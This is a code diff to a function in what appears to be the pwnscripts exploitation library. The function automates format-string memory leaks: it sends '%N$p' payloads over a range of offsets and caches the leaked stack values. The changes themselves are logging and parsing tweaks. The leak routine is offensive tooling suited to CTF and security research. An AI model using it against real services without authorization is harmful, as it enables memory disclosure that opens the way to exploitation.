@@ -72,21 +72,22 @@ def _getprintf(sendprintf: Callable[[bytes],bytes], cache: str) -> Generator:
     Returns: generator that returns (offset, leaked_value) pairs.'''
     if not path.exists(cache_filename := _get_cache_filename(cache)):
         with open(cache_filename, 'x') as f: pass   # make the file
-    log.info('cache is at %s' % cache_filename)
+    log.debug('cache is at %s' % cache_filename)
     # cache_filename *must* be an existing readable file, with every line matching the regex /[0-9]+:[0-9]+/
     with open(cache_filename, 'r') as f:
-        cache_dict = dict([map(int,l.split(':')) for l in f.read().split('\n')])
+        cache_dict = dict([map(int,l.split(':')) for l in f.read().strip().split('\n') if l])
     try: 
         for i in range(config.PRINTF_MIN, config.PRINTF_MAX):
             try: 
-                if i in cache_dict: print('(cached) ', end='')
+                if i in cache_dict: # NOTE: replace the proceeding line with something better
+                    if context.log_level == 10: print('(cached) ', end='')
                 else: # This is the part where an EOFError might occur.
                     payload = 'A'*8 + '%{}$p\n'.format(i) # an unaligned printf will fail here
-                    cache_dict[i] = sendprintf(payload)
+                    cache_dict[i] = unpack_hex(sendprintf(payload))
                 if cache_dict[i] == -1:
                     log.info("pwnscripts: failed to extract printf data for offset %d." % i)
                     continue
-                log.debug('pwnscripts: extracted %d' % cache_dict[i])
+                log.debug('pwnscripts: extracted ' + hex(cache_dict[i]))
                 yield i,cache_dict[i]
             except EOFError: # catch a failed printf call if you can.
                 log.warn("pwnscripts: fsb.find_offset caught EOFError for offset %d!" % i)
